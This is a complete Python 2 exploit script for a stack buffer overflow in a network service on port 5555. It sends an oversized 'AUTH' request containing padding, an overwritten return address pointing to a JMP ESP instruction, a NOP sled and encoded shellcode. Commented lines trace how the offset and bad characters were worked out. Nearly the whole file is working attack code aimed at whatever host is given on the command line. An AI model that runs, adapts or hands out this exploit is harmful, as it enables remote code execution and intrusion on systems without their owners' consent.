#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()
shellcode = (
"\xbe\x9e\xeb\xdc\xb9\xd9\xce\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x75\x12\x83\xc5\x04\x03\xeb\xe5\x3e\x4c\xef\x12\x3c"
"\xaf\x0f\xe3\x21\x39\xea\xd2\x61\x5d\x7f\x44\x52\x15\x2d\x69"
"\x19\x7b\xc5\xfa\x6f\x54\xea\x4b\xc5\x82\xc5\x4c\x76\xf6\x44"
"\xcf\x85\x2b\xa6\xee\x45\x3e\xa7\x37\xbb\xb3\xf5\xe0\xb7\x66"
"\xe9\x85\x82\xba\x82\xd6\x03\xbb\x77\xae\x22\xea\x26\xa4\x7c"
"\x2c\xc9\x69\xf5\x65\xd1\x6e\x30\x3f\x6a\x44\xce\xbe\xba\x94"
"\x2f\x6c\x83\x18\xc2\x6c\xc4\x9f\x3d\x1b\x3c\xdc\xc0\x1c\xfb"
"\x9e\x1e\xa8\x1f\x38\xd4\x0a\xfb\xb8\x39\xcc\x88\xb7\xf6\x9a"
"\xd6\xdb\x09\x4e\x6d\xe7\x82\x71\xa1\x61\xd0\x55\x65\x29\x82"
"\xf4\x3c\x97\x65\x08\x5e\x78\xd9\xac\x15\x95\x0e\xdd\x74\xf2"
"\xe3\xec\x86\x02\x6c\x66\xf5\x30\x33\xdc\x91\x78\xbc\xfa\x66"
"\x7e\x97\xbb\xf8\x81\x18\xbc\xd1\x45\x4c\xec\x49\x6f\xed\x67"
"\x89\x90\x38\x27\xd9\x3e\x93\x88\x89\xfe\x43\x61\xc3\xf0\xbc"
"\x91\xec\xda\xd4\x38\x17\x8d\xd0\xb7\x17\x35\x8d\xc5\x17\xc4"
"\xf6\x43\xf1\xac\x18\x02\xaa\x58\x80\x0f\x20\xf8\x4d\x9a\x4d"
"\x3a\xc5\x29\xb2\xf5\x2e\x47\xa0\x62\xdf\x12\x9a\x25\xe0\x88"
"\xb2\xaa\x73\x57\x42\xa4\x6f\xc0\x15\xe1\x5e\x19\xf3\x1f\xf8"
"\xb3\xe1\xdd\x9c\xfc\xa1\x39\x5d\x02\x28\xcf\xd9\x20\x3a\x09"
"\xe1\x6c\x6e\xc5\xb4\x3a\xd8\xa3\x6e\x8d\xb2\x7d\xdc\x47\x52"
"\xfb\x2e\x58\x24\x04\x7b\x2e\xc8\xb5\xd2\x77\xf7\x7a\xb3\x7f"
"\x80\x66\x23\x7f\x5b\x23\x43\x62\x49\x5e\xec\x3b\x18\xe3\x71"
"\xbc\xf7\x20\x8c\x3f\xfd\xd8\x6b\x5f\x74\xdc\x30\xe7\x65\xac"
"\x29\x82\x89\x03\x49\x87")

#77B3E871   FFE4             JMP ESP
#req1 = "AUTH " + "\x41"*1072
#req1 = "AUTH " + "\x41"*1040+"\x42"*4+"\x43"*(1444-1040-4)  #28
req1 = "AUTH " + "\x41"*1040+"\x71\xE8\xB3\x77"+"\x90"*18+shellcode+"\x43"*(1444-1040-4-351)
#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + badchars

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((server, port))
print repr(s.recv(1024))
s.send(req1+'\r\n')
#print repr(s.recv(1024))
print "Done!"
#except:
     #print "[!] connection refused, check debugger"
s.close()
